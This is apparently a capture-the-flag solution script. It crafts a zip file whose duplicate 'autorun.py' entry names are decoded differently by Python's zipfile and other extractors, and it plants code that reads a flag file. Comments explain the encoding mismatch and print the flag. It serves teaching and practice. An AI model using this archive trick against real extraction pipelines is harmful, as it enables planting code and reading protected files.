#!/usr/bin/env python3
import struct
import zipfile

FUNNY = "äßcii"
CONTENT_SIGNATURE = "YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ"
SUFFIX = "autorun.py"
PATH = FUNNY + "." + CONTENT_SIGNATURE + "." + SUFFIX
CONTENT = b"""import os
print("Directory contents:")
for path in os.listdir('.'):
  if path == '.' or path == '..':
    continue
  if path.endswith(".autorun.py"):
    continue
  print(path)
"""
CONTENT2 = b"""print(open("/home/user/flag").read())"""


def main():
    with zipfile.ZipFile("fake.zip", "w") as zfp:
        zfp.writestr(PATH, CONTENT)
        zfp.writestr(PATH, CONTENT2)
    with open("fake.zip", "rb") as fp:
        data = bytearray(fp.read())
        local_name = data.index(PATH.encode())
        local_name = data.index(PATH.encode(), local_name + 1)
        local = local_name - 30
        local_magic = data[local : local + 4]
        assert local_magic == b"PK\x03\x04", local_magic
        (local_flags,) = struct.unpack("<H", data[local + 6 : local + 8])
        assert (local_flags & 0x800) == 0x800, hex(local_flags)
        local_flags &= ~0x800
        data[local + 6 : local + 8] = struct.pack("<H", local_flags)

        central_name = data.index(PATH.encode(), local_name + 1)
        central_name = data.index(PATH.encode(), central_name + 1)
        central = central_name - 46
        central_magic = data[central : central + 4]
        assert central_magic == b"PK\x01\x02", central_magic
        (central_flags,) = struct.unpack("<H", data[central + 8 : central + 10])
        assert (central_flags & 0x800) == 0x800, hex(central_flags)
        central_flags &= ~0x800
        data[central + 8 : central + 10] = struct.pack("<H", central_flags)
    with open("fake.zip", "wb") as fp:
        fp.write(data)
    # CTF{atheris-hispida-is-the-closest-thing-that-exists-to-a-fuzzy-python}
    #
    #
    # This challenge isn't just a contrived situation, where 'turbozipfile' is buggy. In fact, a previous version of this challenge used the 'unzip' binary that comes with Linux instead of turbozipfile. The exploit for this challenge would work for that too.
    #
    # Python's zipfile implementation is rather unique, at least among zip implementations on Linux. If a filename in an archive is marked as being encoded via IBM Code Page 437, Python will convert it to the Unicode encoding that represents the same logical characters. Most other implementations on Linux don't care what encoding is set in a zip archive, and will simply extract the file to a path with the exact same bytes.
    #
    # It's hard to say that either implementation is more "correct" than the other.
    #  - In support of the zip/unzip tools: Linux file paths are just bytes; whether those bytes should be interpreted according to IBM Code Page 437 or UTF-8 is in the eye of the program that's using them. The zip/unzip tools on Linux can round-trip: you can pack any filename with them (including arbitrary bytes), and get the same filename back out.
    #  -In support of Python: Python's zipfile is more compatible with other systems - those arbitrary-byte files simply aren't permitted on Mac. And it's very clearly still following the ZIP specification: it's interpreting the filenames according to the encoding specified. It's a bit odd that the zip/unzip tools completely ignore a piece of information in the zip files.
    #
    # Long story short: neither implementation is "buggy", they're just different. Avoid mixing zip file implementations within the same system, or vulnerabilities like this one can occur.
    #
    # CTF{atheris-hispida-is-the-closest-thing-that-exists-to-a-fuzzy-python}


if __name__ == "__main__":
    main()
